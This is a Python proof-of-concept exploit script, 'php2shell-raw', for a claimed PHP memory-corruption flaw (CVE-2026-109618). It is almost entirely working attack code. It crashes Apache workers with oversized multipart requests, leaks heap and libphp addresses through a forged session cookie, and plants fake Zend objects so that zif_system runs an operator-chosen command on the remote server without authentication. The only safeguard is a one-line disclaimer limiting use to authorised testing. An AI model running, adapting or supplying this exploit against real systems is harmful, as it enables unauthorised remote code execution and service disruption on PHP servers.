#!/usr/bin/env python3
"""
php2shell-raw — proof of concept for CVE-2026-109618 ("rawkey"), the
memory-corruption half of the PHP2Shell emergency release.

    CVE-2026-109618   RCE via OOM corruption   (this tool)
    CVE-2026-109619   RCE via stale global state

The two CVEs are independent bug families that shipped in the same release
(2026-10-21: PHP 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35).

This PoC drives the *memory* path, not the session-poisoning path used by
php2shell.py. It needs no target-side file, no `session_start()`, no
authentication, and no way to influence the target's configuration: the
whole chain is plain HTTP against any PHP endpoint.

    stage 0   worker rotation
              A request whose last field is 12 MB triggers the out-of-memory
              bailout inside php_session_initialize(); the Apache child dies
              with SIGABRT and prefork forks a fresh worker that inherits
              the same libphp and Zend MM chunk mappings.

    stage 1   heap leak -> Zend MM chunk base
              A uses 1001 POST fields to trip the max_input_vars warning
              (display_errors=On => headers_sent=1) and a PHPSESSID field of
              "\x00" to make PHP mint a fresh session id with send_cookie=1.
              The oversized field then OOMs inside php_session_initialize(),
              which leaves PS(http_session_vars) and PS(id) dangling.
              B re-allocates the freed reference with a 56-byte multipart
              value and carries a forged 192-byte zend_string; the
              out-of-bounds read in php_url_encode() spills Zend MM chunk
              pointers into Set-Cookie (4096 bytes, 98 pointers).

    stage 2   libphp leak -> libphp base
              A parks the dangling PS(id) at chunk+0xb7400. B's 56-byte
              HashTable page makes ZSTR_LEN(PS(id)) read nTableSize=16, so
              the data area starts exactly on nNextFreeElement|pDestructor;
              pDestructor == ZVAL_PTR_DTOR gives the libphp base.

    stage 3   command execution
              A pins the dangling reference at R0 = chunk+0x24e0 with six
              padding fields. B overwrites R0-0x10 with a 55-byte raw buffer
              holding a fake zend_reference whose value is a fake
              HashTable stored in a live 167-byte string, with
              pDestructor = zif_system. The next request that initialises
              the session walks the corrupted heap:

                php_session_track_init()
                  zval_ptr_dtor(PS(http_session_vars))
                    zend_reference_destroy(R0)
                      zval_ptr_dtor(&ref->val)        # IS_ARRAY_EX
                        zend_array_destroy(fake HT)
                          zend_hash_destroy(fake HT)
                            pDestructor(&bucket->val)   # zif_system

              Only zif_system is used, so libc never enters the picture.

Offsets are relative to the Zend MM chunk or to libphp, so they do not
depend on ASLR; they do depend on the exact PHP build, and are read from
the target's own libphp.so when it is reachable.

The mechanism was published by 9bie (php2shell-bypass-aslr-exp); see
https://github.com/9bie/php2shell-bypass-aslr-exp for the original write-up
and the gdb traces. This is an independent implementation.

Target requirements:
    display_errors=1, memory_limit small enough for the oversized field to
    exhaust it, max_input_vars=1000, session.use_cookies=1,
    session.use_strict_mode=0, session.upload_progress.enabled=1, and a
    single-worker prefork Apache with mod_php.

Authorised security testing and education only.
"""

from __future__ import annotations

import argparse
import os
import re
import socket
import ssl
import struct
import sys
import time
import urllib.parse
from collections import Counter

VERSION = "1.0"

# Offsets of the reference build (PHP 8.4.26, Apache 2.4.62/2.4.68,
# Debian 12, gcc 12). They are ASLR-independent but build-specific; use
# --zif-offset / --dtor-offset / --htdata-offset, or an offsets file, for
# any other build.
ZIF_OFFSET = 0x43A870        # zif_system
DTOR_OFFSET = 0x613C50       # ZVAL_PTR_DTOR (zval_ptr_dtor)
HTDATA_OFFSET = 0x6E0D8      # live 167-byte string used as the fake HashTable

# The command rides in the 167-byte carrier: 0x98 bytes of header, NUL.
MAX_CMD = 167 - 0x98 - 1

SID = b"attacksessionid0001"

BANNER = r"""
  ____                 _      ____  _    _           _
 |  _ \ ___  _ __  ___| |__  / ___|| | _(_) ___ ___ | |
 | |_) / _ \| '_ \/ __| '_ \ \___ \| |/ / |/ __/ _ \ | |
 |  __/ (_) | | | \__ \ | | | ___) |   <| | (_|  __/ |_| |
 |_|   \___/|_| |_|___/_| |_| |____/ |_|\_\_|\___\___||_|
"""


def banner(quiet: bool = False) -> None:
    if quiet:
        return
    print(BANNER)
    print(f"  php2shell-raw {VERSION} — CVE-2026-109618 (rawkey) — memory corruption")
    print("  https://github.com/Whackermelon/Php2Shell-POC")
    print()


# --------------------------------------------------------------------------
# offsets
# --------------------------------------------------------------------------

def read_offsets(path: str) -> dict:
    """Read ZIF_OFFSET=0x.. / DTOR_OFFSET=0x.. from an offsets file."""
    out: dict = {}
    if not path:
        return out
    try:
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, val = line.split("=", 1)
                out[key.strip()] = int(val.strip(), 0)
    except (OSError, ValueError):
        pass
    return out


def elf_symbols(data: bytes) -> dict:
    """Parse the ELF symbol tables of a libphp.so, without binutils.

    Both SHT_SYMTAB (local symbols, present when the file is not stripped)
    and SHT_DYNSYM (exported symbols) are read: zif_system is a local
    symbol and only lives in .symtab, while zval_ptr_dtor is exported.
    """
    if data[:4] != b"\x7fELF" or data[4] != 2:
        raise ValueError("not a 64-bit ELF")
    little = data[5] == 1
    end = "<" if little else ">"
    e_shoff, = struct.unpack_from(end + "Q", data, 0x28)
    e_shentsize, e_shnum, e_shstrndx = struct.unpack_from(end + "HHH", data, 0x3A)
    sections = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        _name, stype, _flags, _addr, offset, size, link, _info, _align, entsize = \
            struct.unpack_from(end + "IIQQQQIIQQ", data, off)
        sections.append((stype, offset, size, link, entsize))

    syms = {}
    for stype, off, size, link, entsize in sections:
        if stype not in (2, 11) or not entsize:
            continue
        if link >= len(sections):
            continue
        str_off = sections[link][1]
        for i in range(size // entsize):
            st_name, _info, _other, _shndx, st_value, _size = \
                struct.unpack_from(end + "IBBHQQ", data, off + i * entsize)
            if not st_name:
                continue
            end_name = data.index(b"\x00", str_off + st_name)
            name = data[str_off + st_name:end_name].decode("latin1")
            if name and name not in syms:
                syms[name] = st_value
    return syms


def offsets_from_libphp(path: str) -> dict:
    """Extract the offsets this PoC needs from a libphp.so."""
    with open(path, "rb") as fh:
        syms = elf_symbols(fh.read())
    out = {}
    if "zif_system" in syms:
        out["ZIF_OFFSET"] = syms["zif_system"]
    for name in ("zval_ptr_dtor", "zif_zval_ptr_dtor"):
        if name in syms:
            out["DTOR_OFFSET"] = syms[name]
            break
    return out


# --------------------------------------------------------------------------
# HTTP
# --------------------------------------------------------------------------

class Target:
    """Minimal HTTP client: the chain needs raw multipart bodies and the
    ability to read a response that the worker aborts halfway through."""

    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True):
        parts = urllib.parse.urlsplit(url)
        if parts.scheme not in ("http", "https"):
            raise ValueError("the target URL must be http:// or https://")
        self.https = parts.scheme == "https"
        self.host = parts.hostname or "127.0.0.1"
        self.port = parts.port or (443 if self.https else 80)
        self.path = parts.path or "/"
        if parts.query:
            self.path += "?" + parts.query
        self.timeout = timeout
        self.verbose = verbose

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.https:
                    ctx = ssl.create_default_context()
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as exc:
                last = exc
                time.sleep(0.3)
        raise last  # type: ignore[misc]

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None) -> bytes:
        head = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        sock = self._connect()
        sock.settimeout(timeout or self.timeout)
        try:
            try:
                sock.sendall(head)
                view = memoryview(body)
                for off in range(0, len(body), 262144):
                    sock.sendall(view[off:off + 262144])
            except OSError:
                pass  # the worker may abort while the body is still in flight
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
            return bytes(data)
        finally:
            sock.close()

    def get(self, path: str, read_cap: int = 1 << 20) -> tuple:
        head = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        sock = self._connect()
        sock.settimeout(self.timeout)
        try:
            sock.sendall(head)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            sock.close()
        head_b, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head_b)
        return (int(m.group(1)) if m else 0), body


def multipart(parts, boundary: bytes) -> bytes:
    out = bytearray()
    for part in parts:
        name = part["name"].encode() if isinstance(part["name"], str) else part["name"]
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if part.get("filename") is not None:
            fn = part["filename"]
            fn = fn.encode() if isinstance(fn, str) else fn
            out += b'; filename="' + fn + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + part["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


# --------------------------------------------------------------------------
# leak decoding
# --------------------------------------------------------------------------

def session_cookie(resp: bytes) -> bytes:
    """Extract and URL-decode the PHPSESSID cookie value."""
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base_from_cookie(raw: bytes) -> int:
    """Stage 1: the heap pointers in the cookie are 2 MB aligned."""
    if len(raw) < 1000:
        return 0
    counts: Counter = Counter()
    for i in range(len(raw) - 8):
        value = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= value < 0x800000000000:
            counts[value & ~0x1FFFFF] += 1
    if not counts:
        return 0
    base, hits = counts.most_common(1)[0]
    return base if hits >= 8 else 0


def libphp_base_from_cookie(raw: bytes, dtor_offset: int) -> int:
    """Stage 2: the cookie data starts on nNextFreeElement|pDestructor."""
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if p & 0x1FFFFF != dtor_offset & 0x1FFFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0x1FFFFF == 0 else 0


# --------------------------------------------------------------------------
# exploit
# --------------------------------------------------------------------------

class Rawkey:
    def __init__(self, target: Target, cmd: bytes, zif_offset: int,
                 dtor_offset: int, htdata_offset: int, huge_mb: int,
                 verbose: bool = True):
        self.t = target
        self.cmd = cmd
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.htdata_offset = htdata_offset
        self.huge_mb = huge_mb
        self.verbose = verbose

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    # -- request shapes ---------------------------------------------------

    def _huge_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def _oom_request(self, pad: int = 0) -> None:
        """Request A: many fields (to trip max_input_vars), a null PHPSESSID
        (to mint a new session id) and one oversized field that OOMs the
        request inside php_session_initialize()."""
        parts = [{"name": f"p{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._huge_field(),
        ]
        self.t.post(multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

    def _session_init_request(self, parts) -> bytes:
        """Request B: initialises the session, which walks the corrupted
        heap. Returns the raw response."""
        body = [{"name": "PHPSESSID", "data": SID},
                {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}] + parts
        return self.t.post(multipart(body, b"B" * 10), b"B" * 10,
                           read_cap=1 << 20, timeout=30.0)

    # -- stages ------------------------------------------------------------

    def rotate(self) -> None:
        """Abort the current worker over HTTP; prefork forks a fresh one."""
        self.log("[*] rotating the worker over HTTP")
        self._oom_request()
        time.sleep(0.3)
        self.t.post(multipart([{"name": "PHPSESSID", "data": SID},
                               {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}],
                              b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def stage1(self) -> int:
        """Leak the Zend MM chunk base."""
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._huge_field(),
        ]
        self.t.post(multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

        # B re-allocates the freed reference and carries a forged 192-byte
        # zend_string whose length field lies about the buffer size.
        parts = []
        for i in range(892):
            value = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": value.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)   # forged zend_string length
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        resp = self._session_init_request(parts)
        return chunk_base_from_cookie(session_cookie(resp))

    def stage2(self) -> int:
        """Leak the libphp base through a 56-byte HashTable page."""
        self._oom_request()
        time.sleep(0.2)

        parts = []
        for i in range(983):
            count = 16 if i == 443 else 1
            for j in range(count):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x"})

        resp = self._session_init_request(parts)
        return libphp_base_from_cookie(session_cookie(resp), self.dtor_offset)

    def _fake_objects(self, htdata: int, zif: int) -> tuple:
        """Build the fake HashTable carrier and the fake zend_reference."""
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(
                f"the command is {len(cmd)} bytes but the 167-byte carrier holds "
                f"at most {MAX_CMD} (use a short shell trigger such as 'sh</out/c')"
            )
        ht = bytearray(b"\x00" * 167)
        struct.pack_into("<II", ht, 0x00, 1, 7)                  # gc rc=1, IS_ARRAY
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)      # flags, nTableMask
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)          # arData
        struct.pack_into("<II", ht, 0x18, 1, 1)                  # nNumUsed / nNumOfElements
        struct.pack_into("<II", ht, 0x20, 8, 0)                  # nTableSize / pointer
        struct.pack_into("<Q", ht, 0x28, 0)                      # nNextFreeElement
        struct.pack_into("<Q", ht, 0x30, zif)                    # pDestructor
        # fake execute_data, located at arData + 0x20
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)                  # opline
        struct.pack_into("<Q", ht, E + 0x08, 0)                  # call
        struct.pack_into("<Q", ht, E + 0x10, zif)                # return_value
        struct.pack_into("<Q", ht, E + 0x18, 0)                  # func
        struct.pack_into("<Q", ht, E + 0x20, 0)                  # This.value
        struct.pack_into("<I", ht, E + 0x28, 0)                  # This.u1.type_info
        struct.pack_into("<I", ht, E + 0x2C, 1)                  # num_args
        struct.pack_into("<Q", ht, E + 0x30, 0)                  # prev_execute_data
        struct.pack_into("<Q", ht, E + 0x38, 0)                  # symbol_table
        struct.pack_into("<I", ht, E + 0x40, 0)                  # call_info
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)      # argument 1
        struct.pack_into("<I", ht, E + 0x58, 6)                  # argument 1 is a string
        # fake zend_string, at data + 0x80
        struct.pack_into("<II", ht, 0x80, 1, 0x106)              # gc rc=1, IS_STRING
        struct.pack_into("<Q", ht, 0x88, 0)                      # h
        struct.pack_into("<Q", ht, 0x90, len(cmd))               # length
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        # fake zend_reference, written over R0-0x10
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)                # IS_REFERENCE
        struct.pack_into("<Q", ref, 0x18, htdata)                # val.value
        struct.pack_into("<Q", ref, 0x20, 0x307)                 # IS_ARRAY_EX
        struct.pack_into("<Q", ref, 0x28, 0)                     # sources
        return bytes(ht), bytes(ref)

    def stage3(self, htdata: int, zif: int) -> None:
        """Overwrite PS(http_session_vars) with the fake reference and let
        the next session initialisation call zif_system."""
        # A pins the dangling reference at R0 = chunk+0x24e0.
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (nlen, vlen) in enumerate([(8, 7)] + [(7, 7)] * 5):
            name = (f"p{i:0{nlen - 1}d}" if nlen > 0 else "")[:nlen]
            parts.append({"name": name, "data": b"V" * vlen})
        parts += [self._file_part(), self._huge_field()]
        self.t.post(multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)

        # B writes the fake HashTable and the fake reference.
        ht, ref = self._fake_objects(htdata, zif)
        parts = []
        for i in range(15):
            parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        for i in range(2):
            parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(multipart(parts, b"B" * 10), b"B" * 10,
                    read_cap=65536, timeout=30.0)


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------

def parse_range(text: str) -> tuple:
    """Parse START:END[:STEP] into a list of candidate offsets."""
    parts = text.split(":")
    if len(parts) < 2:
        raise ValueError("expected START:END[:STEP]")
    start = int(parts[0], 0)
    end = int(parts[1], 0)
    step = int(parts[2], 0) if len(parts) > 2 else 0x10
    if step <= 0:
        raise ValueError("the step must be positive")
    return start, end, step


def probe_target(target: Target, size_mb: int) -> int:
    """Report whether the target looks reachable for the rawkey chain.

    Sends one oversized urlencoded field and looks for the out-of-memory
    signature. Cheap, and it tells the operator whether the chain is even
    worth attempting.
    """
    print(f"[*] probing the rawkey preconditions (one {size_mb} MB field name)")
    parts = [{"name": f"p{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (size_mb * 1024 * 1024)},
    ]
    resp = target.post(multipart(parts, b"S" * 17), b"S" * 17,
                       read_cap=1 << 20, timeout=max(90.0, target.timeout))
    body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else resp
    text = body.decode("latin1", "replace")
    oom = "Allowed memory size" in text or "Out of memory" in text
    maxvars = "max_input_vars" in text or "exceeded the maximum" in text
    print(f"    out-of-memory reached      : {'yes' if oom else 'no'}")
    print(f"    max_input_vars warning seen: {'yes' if maxvars else 'no'}")
    if oom:
        print("    -> the target exhausts its memory limit: the rawkey path is open")
        return 0
    print("    -> no OOM: raise --huge-mb, or the target is not reachable")
    return 1


def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell-raw — CVE-2026-109618 (rawkey) memory-corruption RCE",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("-u", "--url", required=True,
                    help="target PHP page, e.g. http://127.0.0.1:8099/index.php")
    ap.add_argument("-c", "--cmd", default="id",
                    help=f"command to run (max {MAX_CMD} bytes)")
    ap.add_argument("--proof-file", default="",
                    help="read this local file after the exploit to confirm it")
    ap.add_argument("--fetch", default="",
                    help="GET this path after the exploit (for commands writing "
                         "into the web root)")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None,
                    help=f"offset of zif_system in libphp (default 0x{ZIF_OFFSET:x})")
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None,
                    help=f"offset of ZVAL_PTR_DTOR in libphp (default 0x{DTOR_OFFSET:x})")
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=HTDATA_OFFSET,
                    help="chunk-relative offset of the 167-byte live string")
    ap.add_argument("--offsets-file", default="",
                    help="read ZIF_OFFSET/DTOR_OFFSET from this file")
    ap.add_argument("--libphp", default="",
                    help="path to the target's libphp.so, to read the offsets")
    ap.add_argument("--sweep-zif", default="",
                    help="brute-force zif_system in START:END[:STEP] (for a "
                         "stripped libphp); the offset must be a multiple of 16")
    ap.add_argument("--huge-mb", type=int, default=12,
                    help="size of the oversized field; must exceed memory_limit")
    ap.add_argument("--timeout", type=float, default=30.0, help="per-request timeout")
    ap.add_argument("--retries", type=int, default=3,
                    help="attempts per leak stage")
    ap.add_argument("--probe", action="store_true",
                    help="only report whether the target looks reachable")
    ap.add_argument("--no-pre-rotate", action="store_true",
                    help="skip the initial worker rotation")
    ap.add_argument("--no-retry-rotate", action="store_true",
                    help="do not rotate the worker between failed attempts")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    if len(args.cmd.encode()) > MAX_CMD:
        ap.error(f"--cmd is limited to {MAX_CMD} bytes by the 167-byte carrier")

    banner(args.quiet)

    offsets = read_offsets(args.offsets_file)
    if args.libphp and not offsets:
        try:
            offsets = offsets_from_libphp(args.libphp)
            if offsets:
                print(f"[*] offsets read from {args.libphp}: "
                      + " ".join(f"{k}=0x{v:x}" for k, v in offsets.items()))
            else:
                print(f"[-] no usable symbol in {args.libphp} (stripped?)", file=sys.stderr)
        except (OSError, ValueError) as exc:
            print(f"[-] cannot read the offsets from {args.libphp}: {exc}", file=sys.stderr)

    if args.zif_offset is None:
        args.zif_offset = offsets.get("ZIF_OFFSET", ZIF_OFFSET)
    if args.dtor_offset is None:
        args.dtor_offset = offsets.get("DTOR_OFFSET", DTOR_OFFSET)

    target = Target(args.url, timeout=args.timeout, verbose=not args.quiet)
    target.log(f"[*] target {args.url}  (cmd={args.cmd!r})")
    target.log(f"[*] offsets: zif=0x{args.zif_offset:x} dtor=0x{args.dtor_offset:x} "
               f"htdata=0x{args.htdata_offset:x} huge={args.huge_mb}M")

    if args.probe:
        return probe_target(target, args.huge_mb)

    ex = Rawkey(target, args.cmd.encode(), args.zif_offset, args.dtor_offset,
                args.htdata_offset, args.huge_mb, verbose=not args.quiet)

    def rotate() -> None:
        if not args.no_retry_rotate:
            ex.rotate()

    if not args.no_pre_rotate:
        ex.rotate()

    # ---- stage 1: chunk base ----
    chunk = 0
    for attempt in range(1, args.retries + 1):
        target.log(f"[*] stage 1/3 heap leak (attempt {attempt}/{args.retries})")
        chunk = ex.stage1()
        if chunk:
            target.log(f"[+] Zend MM chunk base = 0x{chunk:x}")
            break
        target.log("[-] heap leak missed")
        rotate()
    if not chunk:
        print("HEAP_LEAK_FAILED", file=sys.stderr)
        return 1
    ex.rotate()

    # ---- stage 2: libphp base ----
    libphp = 0
    for attempt in range(1, args.retries + 1):
        target.log(f"[*] stage 2/3 libphp leak (attempt {attempt}/{args.retries})")
        libphp = ex.stage2()
        if libphp:
            target.log(f"[+] libphp base = 0x{libphp:x}")
            break
        target.log("[-] libphp leak missed")
        rotate()
    if not libphp:
        print("LIBPHP_LEAK_FAILED", file=sys.stderr)
        return 1
    ex.rotate()

    # ---- stage 3: execution ----
    htdata = chunk + args.htdata_offset
    candidates = [args.zif_offset]
    if args.sweep_zif:
        start, end, step = parse_range(args.sweep_zif)
        candidates = list(range(start, end, step))
        target.log(f"[*] sweeping zif_system over {len(candidates)} candidates")

    for zif in candidates:
        target.log(f"[*] stage 3/3 execution  HTDATA=0x{htdata:x}  ZIF=0x{zif:x}")
        if args.proof_file:
            try:
                if os.path.exists(args.proof_file):
                    os.unlink(args.proof_file)
            except OSError:
                pass

        for attempt in range(1, args.retries + 3):
            try:
                ex.stage3(htdata, zif)
            except OSError as exc:
                target.log(f"[-] request error: {exc}")
            time.sleep(0.8)

            proof = ""
            if args.proof_file:
                try:
                    if os.path.exists(args.proof_file):
                        with open(args.proof_file, "rb") as fh:
                            proof = fh.read().decode("latin1").strip()
                except OSError:
                    pass
            if not proof and args.fetch:
                status, body = target.get(args.fetch)
                if status == 200:
                    proof = body.decode("latin1").strip()
            if proof:
                target.log(f"[+] stage 3 attempt {attempt} confirmed")
                print(f"PROOF: {proof}")
                return 0
            target.log(f"[-] stage 3 attempt {attempt}: no proof yet")
            rotate()
        if len(candidates) > 1:
            target.log(f"[-] zif 0x{zif:x} did not work, next candidate")

    print("EXPLOIT_FAILED (no proof; the command may still have run blind)",
          file=sys.stderr)
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
